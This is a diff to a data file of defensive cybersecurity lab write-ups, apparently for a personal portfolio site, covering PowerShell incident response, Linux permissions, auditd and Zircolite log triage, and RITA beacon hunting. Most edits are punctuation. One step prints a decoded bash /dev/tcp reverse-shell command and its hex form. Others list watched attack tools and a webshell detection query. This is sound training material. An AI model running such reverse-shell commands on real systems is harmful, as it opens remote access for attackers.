         command: "$creds = Get-Credential\ninvoke-command -Authentication Basic -Credential $creds -ComputerName $AlphaServers -command { Get-CimInstance Win32_OperatingSystem | Select-Object CSName, Caption } | Format-Table",
-        commandBreakdown: "-Authentication Basic: simple auth (lab only — use Kerberos/CredSSP in prod)\n-Credential: PSCredential object from Get-Credential\n-ComputerName: array of targets\n-command { ... }: scriptblock executed on every remote host",
+        commandBreakdown: "-Authentication Basic: simple auth (lab only, use Kerberos/CredSSP in prod)\n-Credential: PSCredential object from Get-Credential\n-ComputerName: array of targets\n-command { ... }: scriptblock executed on every remote host",
         screenshot: "/labs/powershell-104456.png",
       },
       {
         title: "Negative control: probe for a file that doesn't exist",
         description:
-          "Ran Get-ChildItem C:\\Windows\\System32\\proxy.exe across the fleet — all three hosts returned PathNotFound. This is a deliberate negative control: it proves Invoke-Command is routing to all three hosts and that the hunt query below isn't silently failing.",
+          "Ran Get-ChildItem C:\\Windows\\System32\\proxy.exe across the fleet, all three hosts returned PathNotFound. This is a deliberate negative control: it proves Invoke-Command is routing to all three hosts and that the hunt query below isn't silently failing.",
         command: "invoke-command -Authentication Basic -Credential $creds -ComputerName $AlphaServers -command { Get-ChildItem C:\\Windows\\System32\\proxy.exe } | Format-Table",
         screenshot: "/labs/powershell-104709.png",
       },
       {
         title: "Fleet-wide enumeration of C:\\Windows\\*.exe",
         description:
-          "Listed every EXE directly under C:\\Windows on all three hosts. The output reveals the same five binaries on each host — bfsvc.exe, notepad.exe, regedit.exe, write.exe (expected Windows binaries) plus broker.exe with a 10/21/2023 timestamp. broker.exe is not a default Windows binary at that path and shows up on every host — a strong IOC signal.",
+          "Listed every EXE directly under C:\\Windows on all three hosts. The output reveals the same five binaries on each host, bfsvc.exe, notepad.exe, regedit.exe, write.exe (expected Windows binaries) plus broker.exe with a 10/21/2023 timestamp. broker.exe is not a default Windows binary at that path and shows up on every host, a strong IOC signal.",
         command: "invoke-command -Authentication Basic -Credential $creds -ComputerName $AlphaServers -command { Get-ChildItem C:\\Windows\\*.exe } | Format-Table",
         screenshot: "/labs/powershell-104904.png",
       },
       {
         title: "Correlate with Event ID 7045 (service installed)",
         description:
-          "Entered a remote session on alpha-svr3 and queried the System log for Event ID 7045 (Service Control Manager: a service was installed). Got a direct match: BrokerSvc, c:\\Windows\\broker.exe, user mode service, auto start, running as LocalSystem. That's the full install record — who installed it (SCM context), when (TimeCreated 12/12/2023), and with what privileges (LocalSystem = full admin on the box).",
+          "Entered a remote session on alpha-svr3 and queried the System log for Event ID 7045 (Service Control Manager: a service was installed). Got a direct match: BrokerSvc, c:\\Windows\\broker.exe, user mode service, auto start, running as LocalSystem. That's the full install record, who installed it (SCM context), when (TimeCreated 12/12/2023), and with what privileges (LocalSystem = full admin on the box).",
         command: "Get-WinEvent -FilterHashtable @{LogName='System'; ID=7045} -MaxEvents 3 | format-list",
         commandBreakdown: "-FilterHashtable: server-side XPath-equivalent filter (fast)\nLogName: which log to query\nID=7045: Service Control Manager 'a service was installed' event\n-MaxEvents 3: cap results",
         screenshot: "/labs/powershell-105306.png",
@@ -1785,14 +1785,14 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Hash the suspicious binary for IOC sharing",
         description:
-          "Ran Get-FileHash -Algorithm SHA256 against C:\\Windows\\broker.exe on the remote host. SHA-256: 646DF7C22A76C92CF6CD83A9B7970C95514047C9431B29909732C62F28963E31. That hash is the shareable IOC: feed it to VirusTotal, add it to a SIEM watchlist, or block it with Defender ASR — it's what turns this single-lab finding into fleet-wide detection content.",
+          "Ran Get-FileHash -Algorithm SHA256 against C:\\Windows\\broker.exe on the remote host. SHA-256: 646DF7C22A76C92CF6CD83A9B7970C95514047C9431B29909732C62F28963E31. That hash is the shareable IOC: feed it to VirusTotal, add it to a SIEM watchlist, or block it with Defender ASR, it's what turns this single-lab finding into fleet-wide detection content.",
         command: "Get-FileHash -Algorithm SHA256 C:\\Windows\\broker.exe",
         commandBreakdown: "-Algorithm SHA256: hash algorithm (MD5/SHA1/SHA256/SHA512 supported)",
         screenshot: "/labs/powershell-105415.png",
       },
     ],
     outcome:
-      "Demonstrated the full arc of PowerShell for Windows incident response: local enumeration with pipelines, interactive triage with Out-GridView, remote execution across a 3-host fleet with Invoke-Command, and a concrete hunt that surfaced a rogue BrokerSvc running broker.exe as LocalSystem — complete with a SHA-256 suitable for distribution as an IOC.",
+      "Demonstrated the full arc of PowerShell for Windows incident response: local enumeration with pipelines, interactive triage with Out-GridView, remote execution across a 3-host fleet with Invoke-Command, and a concrete hunt that surfaced a rogue BrokerSvc running broker.exe as LocalSystem, complete with a SHA-256 suitable for distribution as an IOC.",
     nextStepsInProduction:
       "Ship the SHA-256 to the SIEM and EDR as a detection. Pull the full Event ID 7045 history across the fleet to identify every host where BrokerSvc was installed, not just the three in the lab. Quarantine broker.exe, capture a memory image of any host where it's running, and pivot to 4697 (Security log) and Sysmon Event ID 1/7 for process creation and image-load context. Rotate any credentials that could have been harvested from the LocalSystem-privileged service.",
     securityControlsRelevant: [
@@ -1810,17 +1810,17 @@ export const LABS: CybersecurityLab[] = [
       "Invoke-Command successfully executed against three hosts in parallel from a single console",
     ],
     takeaway: [
-      "The object pipeline is the thing that matters in PowerShell, and it's the part that trips up people coming from bash. Get-Service isn't returning lines of text, it's returning ServiceController objects — which is why Where-Object -Property Status works without any parsing and why Export-Csv can serialize every property automatically. Once you internalize that, you stop writing awk-style text hacks and start chaining cmdlets.",
-      "Invoke-Command is where PowerShell stops being a shell and starts being a fleet tool. Being able to fire the same scriptblock at three — or three thousand — hosts and get back one merged object pipeline is what makes hunting feasible at scale. The negative control here (probing a path that doesn't exist) is the muscle I'd want every analyst to build: before you trust a hunt query, confirm it's actually reaching every target.",
-      "The broker.exe finding is a good real-world shape. The binary sits in C:\\Windows (not System32), shows up identically on every host, has a matching 7045 event, and runs as LocalSystem. None of those signals alone would be conclusive, but together they turn a generic 'enumerate EXEs' query into a clean IOC with a hash you can distribute. That's the workflow — enumerate, correlate, hash, share — and PowerShell gives you all of it in one console.",
+      "The object pipeline is the thing that matters in PowerShell, and it's the part that trips up people coming from bash. Get-Service isn't returning lines of text, it's returning ServiceController objects, which is why Where-Object -Property Status works without any parsing and why Export-Csv can serialize every property automatically. Once you internalize that, you stop writing awk-style text hacks and start chaining cmdlets.",
+      "Invoke-Command is where PowerShell stops being a shell and starts being a fleet tool. Being able to fire the same scriptblock at three, or three thousand, hosts and get back one merged object pipeline is what makes hunting feasible at scale. The negative control here (probing a path that doesn't exist) is the muscle I'd want every analyst to build: before you trust a hunt query, confirm it's actually reaching every target.",
+      "The broker.exe finding is a good real-world shape. The binary sits in C:\\Windows (not System32), shows up identically on every host, has a matching 7045 event, and runs as LocalSystem. None of those signals alone would be conclusive, but together they turn a generic 'enumerate EXEs' query into a clean IOC with a hash you can distribute. That's the workflow, enumerate, correlate, hash, share, and PowerShell gives you all of it in one console.",
     ],
     screenshots: [
-      { src: "/labs/powershell-101645.png", alt: "Get-Process output", caption: "Get-Process — full process table" },
+      { src: "/labs/powershell-101645.png", alt: "Get-Process output", caption: "Get-Process: full process table" },
       { src: "/labs/powershell-101835.png", alt: "Select-Object -Property * on explorer", caption: "Every property on the Explorer process object" },
       { src: "/labs/powershell-102038.png", alt: "Start and inspect notepad", caption: "Start-Process notepad.exe; Get-Process -Name notepad | Select *" },
       { src: "/labs/powershell-102203.png", alt: "Capture process into variable", caption: "$NotepadProc = Get-Process -Name notepad" },
-      { src: "/labs/powershell-102336.png", alt: "Kill process via stored object", caption: "$NotepadProc.kill() — verified by ObjectNotFound on re-query" },
-      { src: "/labs/powershell-102442.png", alt: "Get-Service output", caption: "Get-Service — full service list" },
+      { src: "/labs/powershell-102336.png", alt: "Kill process via stored object", caption: "$NotepadProc.kill(): verified by ObjectNotFound on re-query" },
+      { src: "/labs/powershell-102442.png", alt: "Get-Service output", caption: "Get-Service: full service list" },
       { src: "/labs/powershell-102511.png", alt: "Measure-Object count", caption: "Get-Service | Measure-Object → 278" },
       { src: "/labs/powershell-102612.png", alt: "Where-Object filter Running", caption: "Get-Service | Where-Object -Property Status -like Running" },
       { src: "/labs/powershell-102659.png", alt: "Count running services", caption: "96 Running of 278 total" },
@@ -1828,12 +1828,12 @@ export const LABS: CybersecurityLab[] = [
       { src: "/labs/powershell-102830.png", alt: "Out-GridView filter Running", caption: "Live filter inside Out-GridView" },
       { src: "/labs/powershell-102956.png", alt: "Export-Csv and open in ISE", caption: "Services.csv opened in Windows PowerShell ISE" },
       { src: "/labs/powershell-103122.png", alt: "dir and Get-Alias dir", caption: "dir is an alias for Get-ChildItem" },
-      { src: "/labs/powershell-103151.png", alt: "Format-List on a file", caption: "dir .\\Services.csv | Format-List * — every property" },
+      { src: "/labs/powershell-103151.png", alt: "Format-List on a file", caption: "dir .\\Services.csv | Format-List *: every property" },
       { src: "/labs/powershell-103447.png", alt: "Sort by CreationTime", caption: "dir | Sort-Object CreationTime" },
       { src: "/labs/powershell-104123.png", alt: "Load alpha-servers.txt", caption: "start-servers.ps1 + typed array Get-Content" },
       { src: "/labs/powershell-104456.png", alt: "Invoke-Command across fleet", caption: "Win32_OperatingSystem query on alpha-svr1/2/3.local" },
       { src: "/labs/powershell-104709.png", alt: "Negative control: missing file", caption: "proxy.exe → PathNotFound on all three hosts" },
-      { src: "/labs/powershell-104904.png", alt: "Fleet-wide C:\\Windows\\*.exe", caption: "broker.exe found on every host — IOC candidate" },
+      { src: "/labs/powershell-104904.png", alt: "Fleet-wide C:\\Windows\\*.exe", caption: "broker.exe found on every host: IOC candidate" },
       { src: "/labs/powershell-105306.png", alt: "Event ID 7045 BrokerSvc", caption: "Service Control Manager: BrokerSvc installed, LocalSystem, auto start" },
       { src: "/labs/powershell-105415.png", alt: "SHA-256 of broker.exe", caption: "Get-FileHash → 646DF7C2…63E31" },
     ],
@@ -1850,7 +1850,7 @@ export const LABS: CybersecurityLab[] = [
     date: "Apr 2026",
     artifacts: "Sanitized terminal screenshots from a Docker-based permissions lab container",
     context:
-      "This lab demonstrates the core Linux discretionary access control primitives — file mode bits, umask, and the sticky bit — inside a disposable Docker container. The goal is to understand why default permissions are what they are, how to tighten them for a hardening baseline, and how the sticky bit protects world-writable directories like /tmp from cross-user tampering.",
+      "This lab demonstrates the core Linux discretionary access control primitives, file mode bits, umask, and the sticky bit, inside a disposable Docker container. The goal is to understand why default permissions are what they are, how to tighten them for a hardening baseline, and how the sticky bit protects world-writable directories like /tmp from cross-user tampering.",
     summary:
       "Spun up a Docker permissions lab, tested default umask 0022 (producing 644/755), tightened to umask 0027 to strip world access (640/750), and demonstrated the /tmp sticky bit (drwxrwxrwt) preventing non-owner delete on a shared directory.",
     whyThisMatters:
@@ -1895,7 +1895,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Create a file with the default umask",
         description:
-          "Wrote a line to test_perms.txt with echo, cat-ed it back to confirm content, then ls -l to read the mode. Output: -rw-r--r-- 1 annika annika 7. Owner rw, group r, other r — the canonical 644 you get with umask 0022.",
+          "Wrote a line to test_perms.txt with echo, cat-ed it back to confirm content, then ls -l to read the mode. Output: -rw-r--r-- 1 annika annika 7. Owner rw, group r, other r, the canonical 644 you get with umask 0022.",
         command: "echo annika > test_perms.txt\ncat test_perms.txt\nls -l test_perms.txt",
         screenshot: "/labs/linux-perms-112304.png",
       },
@@ -1909,7 +1909,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Tighten umask to 0027 and retest",
         description:
-          "Set umask to 0027 (group read only, world nothing), created a new file and directory, and listed them. Output: -rw-r----- for secure.txt and drwxr-x--- for secure_dir. That's 640/750 — the hardening baseline used by most CIS benchmarks because it cuts world access entirely while keeping same-group collaboration working.",
+          "Set umask to 0027 (group read only, world nothing), created a new file and directory, and listed them. Output: -rw-r----- for secure.txt and drwxr-x--- for secure_dir. That's 640/750, the hardening baseline used by most CIS benchmarks because it cuts world access entirely while keeping same-group collaboration working.",
         command: "umask 0027\necho annika > secure.txt\nmkdir secure_dir\nls -ld secure*",
         commandBreakdown: "umask 0027: mask bits = user 0, group 2, other 7\nEffect: files default to 640, dirs to 750",
         screenshot: "/labs/linux-perms-113302.png",
@@ -1917,7 +1917,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Sticky bit on /tmp",
         description:
-          "Listed /tmp with ls -ld: drwxrwxrwt. The trailing t is the sticky bit — directory is world-writable, but only the file owner (or root) can rename or delete a file inside it. Created /tmp/sticky_bit_test.txt to demonstrate: any user can write to /tmp, but annika's file is protected from deletion by other users in the same container.",
+          "Listed /tmp with ls -ld: drwxrwxrwt. The trailing t is the sticky bit, directory is world-writable, but only the file owner (or root) can rename or delete a file inside it. Created /tmp/sticky_bit_test.txt to demonstrate: any user can write to /tmp, but annika's file is protected from deletion by other users in the same container.",
         command: "ls -ld /tmp\necho \"only annika may rename or delete this file\" > /tmp/sticky_bit_test.txt\nls -l /tmp/sticky_bit_test.txt",
         commandBreakdown: "drwxrwxrwt: d=dir, rwx (user), rwx (group), rwt (other with sticky)\nt without x would display as T",
         screenshot: "/labs/linux-perms-113804.png",
@@ -1926,7 +1926,7 @@ export const LABS: CybersecurityLab[] = [
     outcome:
       "Walked through the full Linux permission model from first principles: default umask → file mode bits → tightened hardening umask → sticky-bit semantics on a shared directory. End state is a working mental model for why 644/755 is the default, why 640/750 is the hardened baseline, and why /tmp is drwxrwxrwt specifically.",
     nextStepsInProduction:
-      "Set umask 0027 (or 0077 for single-tenant hosts) in /etc/login.defs and /etc/profile so it applies to every interactive session. For service accounts, set the umask in the systemd unit's UMask= directive so spawned processes inherit it. Audit existing sensitive paths (/etc, /var/log, /home) for world-readable files that shouldn't be, and confirm every world-writable directory on the filesystem has the sticky bit — find / -perm -0002 -type d ! -perm -1000 is the one-liner to enforce that.",
+      "Set umask 0027 (or 0077 for single-tenant hosts) in /etc/login.defs and /etc/profile so it applies to every interactive session. For service accounts, set the umask in the systemd unit's UMask= directive so spawned processes inherit it. Audit existing sensitive paths (/etc, /var/log, /home) for world-readable files that shouldn't be, and confirm every world-writable directory on the filesystem has the sticky bit, find / -perm -0002 -type d ! -perm -1000 is the one-liner to enforce that.",
     securityControlsRelevant: [
       "CIS Linux benchmark: default umask 027",
       "File permission auditing (find -perm)",
@@ -1936,14 +1936,14 @@ export const LABS: CybersecurityLab[] = [
     ],
     keyFindings: [
       "Default umask in the lab container is 0022, producing 644 files and 755 dirs",
-      "umask 0027 produces 640 files and 750 dirs — world access eliminated",
-      "/tmp has drwxrwxrwt — world-writable but protected by the sticky bit",
+      "umask 0027 produces 640 files and 750 dirs, world access eliminated",
+      "/tmp has drwxrwxrwt, world-writable but protected by the sticky bit",
       "Group-readable mode (640) preserves same-group collaboration",
     ],
     takeaway: [
-      "umask is the one Linux setting that silently shapes every file created on the system. Most hardening guides start with 027 without explaining why — the why is that 027 is the tightest mask that still permits same-group collaboration, and most systems have a legitimate reason to preserve group access (shared dev team, service account + admin group, etc.). 077 is tighter but breaks those workflows.",
-      "The sticky bit is a good reminder that Unix permissions aren't just user/group/other — they're a small set of orthogonal tools, and the sticky bit is the one that makes shared directories safe. /tmp, /var/tmp, /dev/shm all rely on it. Any world-writable directory without the sticky bit is a finding worth chasing, because it means any user can delete or rename another user's files inside it.",
-      "The docker-compose lab pattern here is understated but useful. You get a clean, throwaway environment for every permission exercise, no risk of clobbering your host, and the setup script handles the network and container lifecycle. Same pattern scales to reproducing customer bugs or running hostile code — it's the defensive version of the sandbox approach.",
+      "umask is the one Linux setting that silently shapes every file created on the system. Most hardening guides start with 027 without explaining why, the why is that 027 is the tightest mask that still permits same-group collaboration, and most systems have a legitimate reason to preserve group access (shared dev team, service account + admin group, etc.). 077 is tighter but breaks those workflows.",
+      "The sticky bit is a good reminder that Unix permissions aren't just user/group/other, they're a small set of orthogonal tools, and the sticky bit is the one that makes shared directories safe. /tmp, /var/tmp, /dev/shm all rely on it. Any world-writable directory without the sticky bit is a finding worth chasing, because it means any user can delete or rename another user's files inside it.",
+      "The docker-compose lab pattern here is understated but useful. You get a clean, throwaway environment for every permission exercise, no risk of clobbering your host, and the setup script handles the network and container lifecycle. Same pattern scales to reproducing customer bugs or running hostile code, it's the defensive version of the sandbox approach.",
     ],
     screenshots: [
       { src: "/labs/linux-perms-112203.png", alt: "Start lab container", caption: "start_6.1.sh brings up lab-61-permissions-1" },
@@ -1970,7 +1970,7 @@ export const LABS: CybersecurityLab[] = [
     summary:
       "Reviewed a Best-Practice auditd rules file (recon + susp_activity + sssd watches), ran aureport --summary to see 28 failed logins / 41020 events / 17 keys, used ausearch -k with -i for interpreted fields, decoded a hex-payload reverse shell to host.docker.internal:3869, and used Zircolite with alpha_rules_linux.json to detect a critical Webshell RCE pattern (177 events).",
     whyThisMatters:
-      "Linux log triage is the #2 most-reported CyberLive skill on GSEC. Knowing aureport/ausearch flags by reflex — especially -k for keyed watches and -i for interpreted output — is the difference between answering a Linux forensics question in 30 seconds vs. burning 5 minutes on syntax.",
+      "Linux log triage is the #2 most-reported CyberLive skill on GSEC. Knowing aureport/ausearch flags by reflex, especially -k for keyed watches and -i for interpreted output, is the difference between answering a Linux forensics question in 30 seconds vs. burning 5 minutes on syntax.",
     tldr: [
       "auditd rules file watches recon (whoami/id/uname), suspicious binaries (nc/nmap/tcpdump/wget), and sssd execve",
       "aureport --summary + aureport --key --summary are the one-command triage views",
@@ -2000,7 +2000,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Open the auditd rules file",
         description:
-          "Opened /sec401/labs/6.3/audit.rules with gedit — Florian Roth's Best-Practice auditd rules file, based on gov.uk auditd, CentOS 7 hardening, and linux-audit.com tuning guides.",
+          "Opened /sec401/labs/6.3/audit.rules with gedit, Florian Roth's Best-Practice auditd rules file, based on gov.uk auditd, CentOS 7 hardening, and linux-audit.com tuning guides.",
         command: "cd /sec401/labs/6.3\ngedit audit.rules &",
         screenshot: "/labs/linux-logging-124638.png",
       },
@@ -2015,7 +2015,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "aureport --summary",
         description:
-          "aureport --input ./audit.log --summary — high-level triage view of a captured audit log. 41020 events, 28 failed logins, 13 failed authentications, 72 commands, 50 executables, 83 files, 1544 failed syscalls, 17 keys, 21518 process IDs. Range Sep 28 2023 20:56 → Sep 29 14:23. This is the one-liner you run first to size the investigation.",
+          "aureport --input ./audit.log --summary, high-level triage view of a captured audit log. 41020 events, 28 failed logins, 13 failed authentications, 72 commands, 50 executables, 83 files, 1544 failed syscalls, 17 keys, 21518 process IDs. Range Sep 28 2023 20:56 → Sep 29 14:23. This is the one-liner you run first to size the investigation.",
         command: "aureport --input ./audit.log --summary",
         commandBreakdown: "--input: read from a file instead of /var/log/audit/audit.log\n--summary: one-screen overview",
         screenshot: "/labs/linux-logging-124927.png",
@@ -2030,7 +2030,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Decode a hex-encoded reverse shell",
         description:
-          "One of the audit events contained a hex-encoded command. Piped the hex string through xxd -r -p to decode: /usr/bin/bash -c (echo </dev/tcp/host.docker.internal/3869) 2>/dev/null — a classic bash /dev/tcp reverse shell testing an open port. Decoding hex-obfuscated payloads is a standard CyberLive skill.",
+          "One of the audit events contained a hex-encoded command. Piped the hex string through xxd -r -p to decode: /usr/bin/bash -c (echo </dev/tcp/host.docker.internal/3869) 2>/dev/null, a classic bash /dev/tcp reverse shell testing an open port. Decoding hex-obfuscated payloads is a standard CyberLive skill.",
         command: "echo -n 2F7573722F62696E2F62617368002D6300286563686F203C2F6465762F7463702F686F73742E646F636B65722E696E7465726E616C2F333836392920323E2F6465762F6E756C6C2026 | xxd -r -p ; echo",
         commandBreakdown: "xxd -r -p: reverse hex to bytes, plain format (no line numbers)\n-n on echo: no trailing newline",
         screenshot: "/labs/linux-logging-125603.png",
@@ -2038,7 +2038,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "ausearch by key",
         description:
-          "ausearch --input audit.log -k sbin_susp — pulls every event with key sbin_susp. Output is the raw audit format: PROCTITLE, PATH, EXECVE, SYSCALL. Shows uid=33 (www-data) invoking /usr/sbin/tcpdump — the web server user spawning a packet sniffer, which is the whole point of the sbin_susp key.",
+          "ausearch --input audit.log -k sbin_susp, pulls every event with key sbin_susp. Output is the raw audit format: PROCTITLE, PATH, EXECVE, SYSCALL. Shows uid=33 (www-data) invoking /usr/sbin/tcpdump, the web server user spawning a packet sniffer, which is the whole point of the sbin_susp key.",
         command: "ausearch --input audit.log -k sbin_susp",
         commandBreakdown: "-k: filter by key (same name you set in the -k rule field)",
         screenshot: "/labs/linux-logging-125730.png",
@@ -2054,7 +2054,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Zircolite: SIGMA over audit.log",
         description:
-          "zircolite --events audit.log --ruleset rules/alpha_rules_linux.json --audit — runs 169 SIGMA detection rules against the audit log. Finished in 13 seconds. Two hits: Webshell Remote Command Execution [critical] → 177 events, System Information Discovery - Auditd [low] → 11 events. Zircolite is the 'one command turns raw audit.log into SIEM-style alerts' tool.",
+          "zircolite --events audit.log --ruleset rules/alpha_rules_linux.json --audit, runs 169 SIGMA detection rules against the audit log. Finished in 13 seconds. Two hits: Webshell Remote Command Execution [critical] → 177 events, System Information Discovery - Auditd [low] → 11 events. Zircolite is the 'one command turns raw audit.log into SIEM-style alerts' tool.",
         command: "zircolite --events audit.log --ruleset rules/alpha_rules_linux.json --audit",
         commandBreakdown: "--events: input log (audit.log, evtx, sysmon)\n--ruleset: compiled SIGMA JSON\n--audit: tells Zircolite this is Linux auditd format",
         screenshot: "/labs/linux-logging-125927.png",
@@ -2062,7 +2062,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Review detected_events.json",
         description:
-          "Zircolite wrote detected_events.json: title 'Webshell Remote Command Execution', id c0d3734d-330f-4a03-aae2-65dacc6a8222, rule_level critical, tags attack.persistence + attack.t1505.003, count 177. The underlying SIGMA query was SELECT * FROM logs WHERE type='SYSCALL' AND syscall='59' AND exe='/usr/bin/dash' — execve of dash by the web server, which is the webshell signature.",
+          "Zircolite wrote detected_events.json: title 'Webshell Remote Command Execution', id c0d3734d-330f-4a03-aae2-65dacc6a8222, rule_level critical, tags attack.persistence + attack.t1505.003, count 177. The underlying SIGMA query was SELECT * FROM logs WHERE type='SYSCALL' AND syscall='59' AND exe='/usr/bin/dash', execve of dash by the web server, which is the webshell signature.",
         command: "gedit detected_events.json &",
         screenshot: "/labs/linux-logging-130206.png",
       },
@@ -2088,10 +2088,10 @@ export const LABS: CybersecurityLab[] = [
     takeaway: [
       "The -k flag is the whole game with auditd. Without keys every rule blurs into one undifferentiated stream; with keys you get a tagged index (aureport --key --summary) that lets you pivot by attacker behavior instead of by syscall. Any production audit rule without a meaningful -k value is a rule that won't get queried.",
       "ausearch -i is the flag people forget under time pressure. Numeric UIDs and epoch timestamps are unreadable in a 5-minute CyberLive window. Train the muscle memory: ausearch -k <key> -i, always.",
-      "Zircolite over audit.log is the shape of modern Linux detection. You keep auditd's low-level coverage but bolt on SIGMA's community detection library and MITRE mapping. That's the difference between 'I have logs' and 'I have alerts' — and it's the answer to the inevitable audit finding that ships every SEC401 graduate into blue-team work.",
+      "Zircolite over audit.log is the shape of modern Linux detection. You keep auditd's low-level coverage but bolt on SIGMA's community detection library and MITRE mapping. That's the difference between 'I have logs' and 'I have alerts', and it's the answer to the inevitable audit finding that ships every SEC401 graduate into blue-team work.",
     ],
     screenshots: [
-      { src: "/labs/linux-logging-124638.png", alt: "Open audit.rules", caption: "gedit audit.rules & — Best-Practice template" },
+      { src: "/labs/linux-logging-124638.png", alt: "Open audit.rules", caption: "gedit audit.rules &: Best-Practice template" },
       { src: "/labs/linux-logging-124837.png", alt: "audit.rules content", caption: "recon + susp_activity + sssd watch rules" },
       { src: "/labs/linux-logging-124927.png", alt: "aureport --summary", caption: "41020 events, 28 failed logins, 17 keys" },
       { src: "/labs/linux-logging-125059.png", alt: "aureport --key --summary", caption: "Top keys: network_socket_created 21638, detect_execve_www 14588" },
@@ -2300,7 +2300,7 @@ export const LABS: CybersecurityLab[] = [
     ],
     screenshots: [
       { src: "/labs/live-investigation-102749.png", alt: "Lab setup and Get-Process baseline", caption: "./live-investigation-setup.ps1 then Get-Process" },
-      { src: "/labs/live-investigation-103059.png", alt: "Inspect lsass", caption: "Get-Process lsass — anchor what a clean process looks like" },
+      { src: "/labs/live-investigation-103059.png", alt: "Inspect lsass", caption: "Get-Process lsass: anchor what a clean process looks like" },
       { src: "/labs/live-investigation-103301.png", alt: "Lsass full property dump", caption: "Get-Process lsass | Select-Object -Property *" },
       { src: "/labs/live-investigation-103423.png", alt: "Projection to Path, Name, Id", caption: "Get-Process lsass | Select-Object -Property Path, Name, Id" },
       { src: "/labs/live-investigation-103656.png", alt: "Filter to explorer", caption: "Where-Object -Property Name -eq explorer" },
@@ -2309,17 +2309,17 @@ export const LABS: CybersecurityLab[] = [
       { src: "/labs/live-investigation-104118.png", alt: "Projected TCP connection table", caption: "Established 192.168.182.132 → 23.11.32.159:80 (OwningProcess 484); listener :4444 owned by PID 1672" },
       { src: "/labs/live-investigation-104503.png", alt: "Confirm PID 1672", caption: "Get-Process | Where-Object -Property Id -eq 1672 → calcache.exe" },
       { src: "/labs/live-investigation-104553.png", alt: "Stop-Process", caption: "Pipelined kill of PID 1672" },
-      { src: "/labs/live-investigation-104759.png", alt: "HKCU root keys", caption: "Get-ChildItem HKCU: — registry hives drive like a filesystem" },
+      { src: "/labs/live-investigation-104759.png", alt: "HKCU root keys", caption: "Get-ChildItem HKCU:: registry hives drive like a filesystem" },
       { src: "/labs/live-investigation-105049.png", alt: "Run-key persistence", caption: "HKCU Run\\Calcache → %TEMP%\\calcache.exe" },
-      { src: "/labs/live-investigation-105459.png", alt: "Eradicate persistence", caption: "Remove-ItemProperty then Remove-Item — registry first, binary second" },
+      { src: "/labs/live-investigation-105459.png", alt: "Eradicate persistence", caption: "Remove-ItemProperty then Remove-Item: registry first, binary second" },
       { src: "/labs/live-investigation-110358.png", alt: "Baseline files", caption: ".\\baseline contains services, scheduled tasks, and local user snapshots" },
       { src: "/labs/live-investigation-110643.png", alt: "Snapshot services", caption: "Get-Service | Select-Object -ExpandProperty Name | Out-File services.txt" },
       { src: "/labs/live-investigation-110941.png", alt: "Snapshot scheduled tasks and users", caption: "Out-File scheduledtasks.txt and localusers.txt" },
       { src: "/labs/live-investigation-111020.png", alt: "Sanity-check services.txt", caption: "Get-Content -First 10" },
       { src: "/labs/live-investigation-111140.png", alt: "Load snapshots into variables", caption: "$servicesnow and $servicebaseline" },
-      { src: "/labs/live-investigation-111230.png", alt: "Diff services", caption: "Compare-Object — rogue 'Dynamics' service flagged with SideIndicator =>" },
+      { src: "/labs/live-investigation-111230.png", alt: "Diff services", caption: "Compare-Object: rogue 'Dynamics' service flagged with SideIndicator =>" },
       { src: "/labs/live-investigation-111452.png", alt: "Scheduled task enum", caption: "Get-ScheduledTask raw output" },
-      { src: "/labs/live-investigation-111723.png", alt: "Diff scheduled tasks", caption: "Compare-Object — rogue 'Microsoft eDynamics' scheduled task flagged" },
+      { src: "/labs/live-investigation-111723.png", alt: "Diff scheduled tasks", caption: "Compare-Object: rogue 'Microsoft eDynamics' scheduled task flagged" },
     ],
   },
   {
@@ -2338,7 +2338,7 @@ export const LABS: CybersecurityLab[] = [
     summary:
       "Imported a falsimentis Zeek dataset into RITA and triaged a HIGH severity 98.60% beacon to 91.189.89.198 (Canonical NTP, false positive). Added 91.189.89.0/24 to the CIDR safelist, wired the malwaresum threat-intel feed into config.hjson, and re-imported. The clean run surfaced three HIGH severity beacons from 172.16.42.2 / 172.16.42.3 / 172.16.42.108 to 167.172.201.123, all with Threat Intel hits. Tracing the proxied traffic in access.log revealed the C2 was disguised as www1-google-analytics.com with ORIGINAL_DST 167.172.201.123, and an awk pivot identified four internal hosts (172.16.42.103/105/107/109) calling the same fake-analytics endpoint.",
     whyThisMatters:
-      "Modern adversaries blend C2 into legitimate-looking DNS names and ride low-rate beacons that human eyes miss. RITA's beacon score plus a tuned safelist plus a threat-intel feed is the open-source recipe for finding that traffic in a real Zeek pipeline. The skill is not running the tool — it is recognizing which 'high severity' findings are noise and which are the real thing, and knowing how to tune the pipeline to demote the noise without burying the signal.",
+      "Modern adversaries blend C2 into legitimate-looking DNS names and ride low-rate beacons that human eyes miss. RITA's beacon score plus a tuned safelist plus a threat-intel feed is the open-source recipe for finding that traffic in a real Zeek pipeline. The skill is not running the tool, it is recognizing which 'high severity' findings are noise and which are the real thing, and knowing how to tune the pipeline to demote the noise without burying the signal.",
     tldr: [
       "Imported a week of falsimentis Zeek logs into RITA, triaged a 98.60% beacon to a Canonical NTP server as a false positive",
       "Tuned config.hjson with a CIDR safelist and an external threat-intel feed (malwaresum), then re-imported the dataset",
@@ -2387,13 +2387,13 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Confirm or refute on MalwareSum",
         description:
-          "Looked up 91.189.89.198 on MalwareSum. The reputation report identified the IP as belonging to AS41231 Canonical Group Limited, network 91.189.88.0/21, range 91.189.88.0 – 91.189.95.255. Score 623 upvotes / 1 downvote, with comments confirming it is the Canonical NTP server. A 98.60% beacon to NTP is exactly the behavior NTP is supposed to exhibit, so this is a textbook false positive. The signal is real, but the verdict is benign.",
+          "Looked up 91.189.89.198 on MalwareSum. The reputation report identified the IP as belonging to AS41231 Canonical Group Limited, network 91.189.88.0/21, range 91.189.88.0 to 91.189.95.255. Score 623 upvotes / 1 downvote, with comments confirming it is the Canonical NTP server. A 98.60% beacon to NTP is exactly the behavior NTP is supposed to exhibit, so this is a textbook false positive. The signal is real, but the verdict is benign.",
         screenshot: "/labs/rita-beacon-114553.png",
       },
